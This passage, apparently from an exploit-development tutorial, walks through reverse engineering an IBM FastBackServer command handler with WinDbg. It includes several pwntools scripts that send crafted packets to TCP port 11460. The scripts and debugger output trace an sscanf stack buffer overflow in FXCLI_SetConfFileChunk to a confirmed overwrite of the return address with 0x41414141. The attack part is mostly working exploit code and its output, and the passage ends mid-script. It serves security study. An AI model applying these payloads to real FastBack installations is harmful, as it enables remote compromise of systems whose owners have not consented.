</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import </span><span class="mi">*</span><span class="p">

payload </span><span class="o"> =</span><span class="no"> b</span><span class="s">""</span><span class="p">
</span><span class="c1"># Checksum</span><span class="p">
payload</span><span class="o"> =</span><span class="p"> p32(</span><span class="mi">0x630</span><span class="p">, endian</span><span class="o">=</span><span class="s">"big"</span><span class="p">)
</span><span class="c1"># psAgentCommand</span><span class="p">
payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="mi"> 0x10</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x0</span><span class="p">)</span><span class="c1">    # 1st memcpy: offset</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x100</span><span class="p">)</span><span class="c1">  # 1st memcpy: size field  </span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x100</span><span class="p">)</span><span class="c1">  # 2nd memcpy: offset</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x200</span><span class="p">)</span><span class="c1">  # 2nd memcpy: size field  </span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x300</span><span class="p">)</span><span class="c1">  # 3rd memcpy: offset</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x300</span><span class="p">)</span><span class="c1">  # 3rd memcpy: size field  </span><span class="p">
payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="mi"> 0x8</span><span class="p">
</span><span class="c1"># psCommandBuffer</span><span class="p">
payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"B"</span><span class="o"> *</span><span class="mi"> 0x100</span><span class="c1"> # 3nd buffer</span><span class="p">
payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"C"</span><span class="o"> *</span><span class="mi"> 0x200</span><span class="c1"> # 2nd buffer</span><span class="p">
payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"D"</span><span class="o"> *</span><span class="mi"> 0x300</span><span class="c1"> # 3rd buffer</span><span class="p">

shell</span><span class="o"> =</span><span class="p"> remote(</span><span class="s">"Windows"</span><span class="p">,</span><span class="mi"> 11460</span><span class="p">)
shell.send(payload)</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> bp FastBackServer!FXCLI_OraBR_Exec_Command + 0x43b

</span><span class="ro">0:000></span><span class="p"> g
Breakpoint 0 hit
eax=06ddac0c ebx=05b0c5c8 ecx=0d243b30 edx=05b0c890 esi=05b0c5c8 edi=00669360  
eip=0056c8f1 esp=0d1ee328 ebp=0d24fe98 iopl=0         nv up ei pl nz na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206  
FastBackServer!FXCLI_OraBR_Exec_Command+0x43b:
0056c8f1 e84aa50f00      call    FastBackServer!memcpy (00666e40)

</span><span class="ro">0:000></span><span class="p"> dds esp L3
0d1ee328  0d243b30
0d1ee32c  06ddac0c
0d1ee330  00000100

</span><span class="ro">0:000></span><span class="p"> db poi(esp + 4)
06ddac0c  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
06ddac1c  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
06ddac2c  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
06ddac3c  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
06ddac4c  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
06ddac5c  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
06ddac6c  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
06ddac7c  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:006></span><span class="p"> r
eax=0d249cf0 ebx=05b0c5c8 ecx=05b0c890 edx=06ddad0c esi=05b0c5c8 edi=00669360  
eip=0056c937 esp=0d1ee328 ebp=0d24fe98 iopl=0         nv up ei pl nz na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206  
FastBackServer!FXCLI_OraBR_Exec_Command+0x481:
0056c937 e804a50f00      call    FastBackServer!memcpy (00666e40)

</span><span class="ro">0:000></span><span class="p"> dds esp L3
0d1ee328  0d249cf0
0d1ee32c  06ddad0c
0d1ee330  00000200

</span><span class="ro">0:006></span><span class="p"> db poi(esp + 4)
06ddad0c  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
06ddad1c  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
06ddad2c  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
06ddad3c  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
06ddad4c  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
06ddad5c  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
06ddad6c  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
06ddad7c  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> r
eax=05b0c890 ebx=05b0c5c8 ecx=06ddaf0c edx=0d23d980 esi=05b0c5c8 edi=00669360  
eip=0056c97d esp=0d1ee328 ebp=0d24fe98 iopl=0         nv up ei pl nz na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206  
FastBackServer!FXCLI_OraBR_Exec_Command+0x4c7:
0056c97d e8bea40f00      call    FastBackServer!memcpy (00666e40)

</span><span class="ro">0:000></span><span class="p"> dds esp L3
0d1ee328  0d23d980
0d1ee32c  06ddaf0c
0d1ee330  00000300

</span><span class="ro">0:000></span><span class="p"> db poi(esp + 4)
06ddaf0c  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
06ddaf1c  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
06ddaf2c  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
06ddaf3c  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
06ddaf4c  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
06ddaf5c  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
06ddaf6c  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
06ddaf7c  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD</span>
</code></pre></div></div><br>

<a href="/exploit-development/windows-user/reverse-engineering/50.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/50.png"></p></div></a>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> r
eax=05b0c890 ebx=05b0c5c8 ecx=00000300 edx=05b0c880 esi=05b0c5c8 edi=00669360
eip=0056c9a6 esp=0d1ee334 ebp=0d24fe98 iopl=0         nv up ei pl nz ac po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
FastBackServer!FXCLI_OraBR_Exec_Command+0x4f0:
0056c9a6 817a0c90100000  cmp     dword ptr [edx+0Ch],1090h ds:0023:05b0c88c=41414141  

</span><span class="ro">0:000></span><span class="p"> dd edx
05b0c880  41414141 41414141 0cf47020 41414141
05b0c890  00000000 00000100 00000100 00000200
05b0c8a0  00000300 00000300 41414141 06ddac08
05b0c8b0  37f6ef98 081d89a7 4c435846 534d5f49
05b0c8c0  00005147 00000000 00000000 00000000
05b0c8d0  00000000 00000000 00000000 00000000
05b0c8e0  00000000 00000000 00000000 00000000
05b0c8f0  00000000 00000000 00000000 00000000</span>
</code></pre></div></div><br>

<a href="/exploit-development/windows-user/reverse-engineering/51.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/51.png"></p></div></a>

<a href="/exploit-development/windows-user/reverse-engineering/52.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/52.png"></p></div></a>

<a href="/exploit-development/windows-user/reverse-engineering/53.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/53.png"></p></div></a>

<a href="/exploit-development/windows-user/reverse-engineering/54.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/54.png"></p></div></a>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3</span><span class="p">
</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="mi"> *</span><span class="p">

payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
</span><span class="c1"># Checksum</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x630</span><span class="p">, endian</span><span class="o">=</span><span class="s">"big"</span><span class="p">)
</span><span class="c1"># psAgentCommand</span><span class="p">
payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="mi"> 12</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x534</span><span class="p">)</span><span class="c1"> # opcode</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x0</span><span class="p">)</span><span class="c1">   # 1st memcpy: offset</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x100</span><span class="p">)</span><span class="c1"> # 1st memcpy: size field  </span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x100</span><span class="p">)</span><span class="c1"> # 2nd memcpy: offset</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x200</span><span class="p">)</span><span class="c1"> # 2nd memcpy: size field  </span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x300</span><span class="p">)</span><span class="c1"> # 3rd memcpy: offset</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x300</span><span class="p">)</span><span class="c1"> # 3rd memcpy: size field  </span><span class="p">
payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> * </span><span class="mi">8</span><span class="p">
</span><span class="c1"># psCommandBuffer</span><span class="p">
payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"B"</span><span class="o"> *</span><span class="mi"> 0x100 </span><span class="c1"># 3nd buffer</span><span class="p">
payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"C"</span><span class="o"> *</span><span class="mi"> 0x200 </span><span class="c1"># 2nd buffer</span><span class="p">
payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"D"</span><span class="o"> *</span><span class="mi"> 0x300 </span><span class="c1"># 3rd buffer</span><span class="p">

shell</span><span class="o"> =</span><span class="p"> remote(</span><span class="s">"Windows"</span><span class="p">,</span><span class="mi"> 11460</span><span class="p">)
shell.send(payload)</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> bp FastBackServer!FXCLI_OraBR_Exec_Command + 0x6ac

</span><span class="ro">0:000></span><span class="p"> g
Breakpoint 0 hit
eax=0599c8b0 ebx=0599ad00 ecx=00000534 edx=00000001 esi=0599ad00 edi=00669360
eip=0056cb62 esp=0d58e334 ebp=0d5efe98 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
FastBackServer!FXCLI_OraBR_Exec_Command+0x6ac:
0056cb62 81bdd0e4f9ff16100000 cmp dword ptr [ebp-61B30h],1016h ss:0023:0d58e368=00000534

</span><span class="ro">0:000></span><span class="p"> u eip L10
FastBackServer!FXCLI_OraBR_Exec_Command+0x6ac:
0056cb62 81bdd0e4f9ff16100000 cmp dword ptr [ebp-61B30h],1016h
0056cb6c 0f8ffa030000    jg      FastBackServer!FXCLI_OraBR_Exec_Command+0xab6 (0056cf6c)
0056cb72 81bdd0e4f9ff16100000 cmp dword ptr [ebp-61B30h],1016h
0056cb7c 0f846a650000    je      FastBackServer!FXCLI_OraBR_Exec_Command+0x6c36 (005730ec)  
0056cb82 81bdd0e4f9ff54050000 cmp dword ptr [ebp-61B30h],554h
0056cb8c 0f8fb4010000    jg      FastBackServer!FXCLI_OraBR_Exec_Command+0x890 (0056cd46)
0056cb92 81bdd0e4f9ff54050000 cmp dword ptr [ebp-61B30h],554h
0056cb9c 0f84c3320000    je      FastBackServer!FXCLI_OraBR_Exec_Command+0x39af (0056fe65)  
0056cba2 81bdd0e4f9ff17050000 cmp dword ptr [ebp-61B30h],517h
0056cbac 0f8f60010000    jg      FastBackServer!FXCLI_OraBR_Exec_Command+0x85c (0056cd12)
0056cbb2 81bdd0e4f9ff17050000 cmp dword ptr [ebp-61B30h],517h
0056cbbc 0f84512e0000    je      FastBackServer!FXCLI_OraBR_Exec_Command+0x355d (0056fa13)  
0056cbc2 81bdd0e4f9ff01050000 cmp dword ptr [ebp-61B30h],501h
0056cbcc 0f8f0c010000    jg      FastBackServer!FXCLI_OraBR_Exec_Command+0x828 (0056ccde)
0056cbd2 81bdd0e4f9ff01050000 cmp dword ptr [ebp-61B30h],501h
0056cbdc 0f8470110000    je      FastBackServer!FXCLI_OraBR_Exec_Command+0x189c (0056dd52)  </span>
</code></pre></div></div><br>

<a href="/exploit-development/windows-user/reverse-engineering/55.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/55.png"></p></div></a>

<a href="/exploit-development/windows-user/reverse-engineering/56.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/56.png"></p></div></a>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> r
eax=0599c8b0 ebx=0599ad00 ecx=00000534 edx=0000001c esi=0599ad00 edi=00669360
eip=0056cd31 esp=0d58e334 ebp=0d5efe98 iopl=0         nv up ei ng nz na pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000287
FastBackServer!FXCLI_OraBR_Exec_Command+0x87b:
0056cd31 8b8dd0e4f9ff    mov     ecx,dword ptr [ebp-61B30h] ss:0023:0d58e368=0000001c

</span><span class="ro">0:000></span><span class="p"> p
eax=0599c8b0 ebx=0599ad00 ecx=0000001c edx=0000001c esi=0599ad00 edi=00669360
eip=0056cd37 esp=0d58e334 ebp=0d5efe98 iopl=0         nv up ei ng nz na pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000287
FastBackServer!FXCLI_OraBR_Exec_Command+0x881:
0056cd37 33c0            xor     eax,eax

</span><span class="ro">0:000></span><span class="p"> p
eax=00000000 ebx=0599ad00 ecx=0000001c edx=0000001c esi=0599ad00 edi=00669360
eip=0056cd39 esp=0d58e334 ebp=0d5efe98 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
FastBackServer!FXCLI_OraBR_Exec_Command+0x883:
0056cd39 8a816e5f5700    mov     al,byte ptr FastBackServer!FXCLI_OraBR_Exec_Command+0x9ab8 (00575f6e)[ecx] ds:0023:00575f8a=10  

</span><span class="ro">0:000></span><span class="p"> db 00575f6e + 0x1c L1
00575f8a  10</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> p
eax=00000010 ebx=0599ad00 ecx=0000001c edx=0000001c esi=0599ad00 edi=00669360
eip=0056cd3f esp=0d58e334 ebp=0d5efe98 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
FastBackServer!FXCLI_OraBR_Exec_Command+0x889:
0056cd3f ff2485065f5700  jmp     dword ptr FastBackServer!FXCLI_OraBR_Exec_Command+0x9a50 (00575f06)[eax*4] ds:0023:00575f46=00572e27  

</span><span class="ro">0:000></span><span class="p"> dd 00575f06 + 0x10 * 4 L1
00575f46  00572e27

</span><span class="ro">0:000></span><span class="p"> p
eax=00000010 ebx=0599ad00 ecx=0000001c edx=0000001c esi=0599ad00 edi=00669360
eip=00572e27 esp=0d58e334 ebp=0d5efe98 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
FastBackServer!FXCLI_OraBR_Exec_Command+0x6971:
00572e27 668b85acdafeff  mov     ax,word ptr [ebp-12554h] ss:0023:0d5dd944=409d</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> r
eax=0d5dd980 ebx=0599ad00 ecx=0d5e3b30 edx=0599c8c0 esi=0599ad00 edi=00669360
eip=00572e52 esp=0d58e31c ebp=0d5efe98 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
FastBackServer!FXCLI_OraBR_Exec_Command+0x699c:
00572e52 e8b45e0000      call    FastBackServer!FXCLI_SetConfFileChunk (00578d0b)  

</span><span class="ro">0:000></span><span class="p"> dd esp L6
0d58e31c  0599c8c0 0d5e3b30 0d5dd980 0d5e3b2c
0d58e32c  87e9a8c0 0000409d

</span><span class="ro">0:000></span><span class="p"> dd poi(esp) 
0599c8c0  00000000 00000100 00000100 00000200
0599c8d0  00000300 00000300 41414141 06c4bc08
0599c8e0  2e313ce2 081eee01 4c435846 534d5f49
0599c8f0  00005147 00000000 00000000 00000000
0599c900  00000000 00000000 00000000 00000000
0599c910  00000000 00000000 00000000 00000000
0599c920  00000000 00000000 00000000 00000000
0599c930  00000000 00000000 00000000 00000000

</span><span class="ro">0:000></span><span class="p"> dd poi(esp + 4) 
0d5e3b30  42424242 42424242 42424242 42424242
0d5e3b40  42424242 42424242 42424242 42424242
0d5e3b50  42424242 42424242 42424242 42424242
0d5e3b60  42424242 42424242 42424242 42424242
0d5e3b70  42424242 42424242 42424242 42424242
0d5e3b80  42424242 42424242 42424242 42424242
0d5e3b90  42424242 42424242 42424242 42424242
0d5e3ba0  42424242 42424242 42424242 42424242

</span><span class="ro">0:000></span><span class="p"> dd poi(esp + 8) 
0d5dd980  44444444 44444444 44444444 44444444
0d5dd990  44444444 44444444 44444444 44444444
0d5dd9a0  44444444 44444444 44444444 44444444
0d5dd9b0  44444444 44444444 44444444 44444444
0d5dd9c0  44444444 44444444 44444444 44444444
0d5dd9d0  44444444 44444444 44444444 44444444
0d5dd9e0  44444444 44444444 44444444 44444444
0d5dd9f0  44444444 44444444 44444444 44444444</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> r
eax=0d58e310 ebx=0599ad00 ecx=0d58e204 edx=0d5e3b30 esi=0599ad00 edi=00669360  
eip=00578d4b esp=0d58dbc0 ebp=0d58e314 iopl=0         nv up ei pl nz ac po nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212  
FastBackServer!FXCLI_SetConfFileChunk+0x40:
00578d4b e8d5e70e00      call    FastBackServer!sscanf (00667525)

</span><span class="ro">0:000></span><span class="p"> dd esp L7
0d58dbc0  0d5e3b30 0085b0dc 0d58e204 0d58e310
0d58dbd0  0d58dffc 0d58e308 0d58e30c

</span><span class="ro">0:000> </span><span class="p">dd poi(esp)
0d5e3b30  42424242 42424242 42424242 42424242
0d5e3b40  42424242 42424242 42424242 42424242
0d5e3b50  42424242 42424242 42424242 42424242
0d5e3b60  42424242 42424242 42424242 42424242
0d5e3b70  42424242 42424242 42424242 42424242
0d5e3b80  42424242 42424242 42424242 42424242
0d5e3b90  42424242 42424242 42424242 42424242
0d5e3ba0  42424242 42424242 42424242 42424242

</span><span class="ro">0:000></span><span class="p"> da poi(esp + 4)
0085b0dc  "File: %s From: %d To: %d ChunkLo"
0085b0fc  "c: %d FileLoc: %d"</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">dd esp L7
0d58dbc0  0d5e3b30 0085b0dc 0d58e204 0d58e310
0d58dbd0  0d58dffc 0d58e308 0d58e30c

</span><span class="ro">0:000></span><span class="p"> !teb
TEB at 00328000
    ExceptionList:        0d5eff38
    StackBase:            0d5f0000
    StackLimit:           0d58d000
    SubSystemTib:         00000000
    FiberData:            00001e00
    ArbitraryUserPointer: 00000000
    Self:                 00328000
    EnvironmentPointer:   00000000
    ClientId:             00000524 . 00001c44
    RpcHandle:            00000000
    Tls Storage:          00e09ea8
    PEB Address:          002cd000
    LastErrorValue:       0
    LastStatusValue:      c000000d
    Count Owned Locks:    0
    HardErrorMode:        0

</span><span class="ro">0:000></span><span class="p"> k
 # ChildEBP RetAddr      
00 0d58e314 00572e57     FastBackServer!FXCLI_SetConfFileChunk+0x40
01 0d5efe98 0056a21f     FastBackServer!FXCLI_OraBR_Exec_Command+0x69a1  
02 0d5efeb4 00581366     FastBackServer!FXCLI_C_ReceiveCommand+0x130
03 0d5efef0 0048ca98     FastBackServer!FX_AGENT_Cyclic+0x116
04 0d5eff48 006693e9     FastBackServer!ORABR_Thread+0xef
05 0d5eff80 75439564     FastBackServer!_beginthreadex+0xf4
06 0d5eff94 77aa293c     KERNEL32!BaseThreadInitThunk+0x24
07 0d5effdc 77aa2910     ntdll!__RtlUserThreadStart+0x2b
08 0d5effec 00000000     ntdll!_RtlUserThreadStart+0x1b</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> dds 0d58e314 L2
0d58e314  0d5efe98
0d58e318  00572e57 FastBackServer!FXCLI_OraBR_Exec_Command+0x69a1  

</span><span class="ro">0:000></span><span class="p"> ? 0d58e318 - poi(esp + 8)
Evaluate expression: 276 = 00000114</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3</span><span class="p">
</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="mi"> *</span><span class="p">

payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
</span><span class="c1"># psAgentCommand</span><span class="p">
payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="mi"> 12</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x534</span><span class="p">)</span><span class="c1"> # opcode</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x0</span><span class="p">)</span><span class="c1">   # 1st memcpy: offset</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x200</span><span class="p">)</span><span class="c1"> # 1st memcpy: size field</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x0</span><span class="p">)</span><span class="c1">   # 2nd memcpy: offset</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x100</span><span class="p">)</span><span class="c1"> # 2nd memcpy: size field</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x0</span><span class="p">)</span><span class="c1">   # 3rd memcpy: offset</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x100</span><span class="p">)</span><span class="c1"> # 3rd memcpy: size field</span><span class="p">
payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="mi"> 8</span><span class="p">
</span><span class="c1"># psCommandBuffer</span><span class="p">

buffer</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="mi"> 0x200</span><span class="p">

payload</span><span class="o"> +=</span><span class="no"> f</span><span class="s">"File: </span><span class="p">{buffer}</span><span class="s"> From: 0 To: 0 ChunkLoc: 0 FileLoc: 0"</span><span class="p">.encode()  
payload</span><span class="o"> =</span><span class="p"> p32(</span><span class="no">len</span><span class="p">(payload)</span><span class="o"> -</span><span class="mi"> 4</span><span class="p">, endian</span><span class="o">=</span><span class="s">"big"</span><span class="p">)</span><span class="o"> +</span><span class="p"> payload</span><span class="p">

shell</span><span class="o"> =</span><span class="p"> remote(</span><span class="s">"Windows"</span><span class="p">,</span><span class="mi"> 11460</span><span class="p">)
shell.send(payload)</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> bp FastBackServer!FXCLI_SetConfFileChunk + 0x40

</span><span class="ro">0:000></span><span class="p"> g
Breakpoint 0 hit
eax=0cece310 ebx=05c0b660 ecx=0cece204 edx=0cf23b30 esi=05c0b660 edi=00669360  
eip=00578d4b esp=0cecdbc0 ebp=0cece314 iopl=0         nv up ei pl nz ac po nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212  
FastBackServer!FXCLI_SetConfFileChunk+0x40:
00578d4b e8d5e70e00      call    FastBackServer!sscanf (00667525)

</span><span class="ro">0:000></span><span class="p"> dd esp L7
0cecdbc0  0cf23b30 0085b0dc 0cece204 0cece310
0cecdbd0  0cecdffc 0cece308 0cece30c

</span><span class="ro">0:000></span><span class="p"> da poi(esp)
0cf23b30  "File: AAAAAAAAAAAAAAAAAAAAAAAAAA"
0cf23b50  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0cf23b70  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0cf23b90  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0cf23bb0  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0cf23bd0  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0cf23bf0  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0cf23c10  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0cf23c30  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0cf23c50  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0cf23c70  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0cf23c90  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> k L4
 # ChildEBP RetAddr      
00 0cece314 00572e57     FastBackServer!FXCLI_SetConfFileChunk+0x40
01 0cf2fe98 0056a21f     FastBackServer!FXCLI_OraBR_Exec_Command+0x69a1
02 0cf2feb4 00581366     FastBackServer!FXCLI_C_ReceiveCommand+0x130
03 0cf2fef0 0048ca98     FastBackServer!FX_AGENT_Cyclic+0x116

</span><span class="ro">0:000></span><span class="p"> p
eax=00000001 ebx=05c0b660 ecx=0cecdb98 edx=0cecdb98 esi=05c0b660 edi=00669360
eip=00578d50 esp=0cecdbc0 ebp=0cece314 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
FastBackServer!FXCLI_SetConfFileChunk+0x45:
00578d50 83c41c          add     esp,1Ch

</span><span class="ro">0:000></span><span class="p"> k
 # ChildEBP RetAddr      
00 0cece314 41414141     FastBackServer!FXCLI_SetConfFileChunk+0x45
WARNING: Frame IP not in any known module. Following frames may be wrong.
01 0cece318 41414141     0x41414141
02 0cece31c 41414141     0x41414141
03 0cece320 41414141     0x41414141
04 0cece324 41414141     0x41414141
05 0cece328 41414141     0x41414141
06 0cece32c 41414141     0x41414141

</span><span class="ro">0:007></span><span class="p"> g
(40.1e14): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=05c0b660 ecx=0cecca70 edx=77ad1670 esi=05c0b660 edi=00669360  
eip=41414141 esp=0cece31c ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246  
41414141 ??              ???</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3</span><span class="p">
</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="mi"> *</span><span class="p">

payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="mi"> 12</span><span class="p">
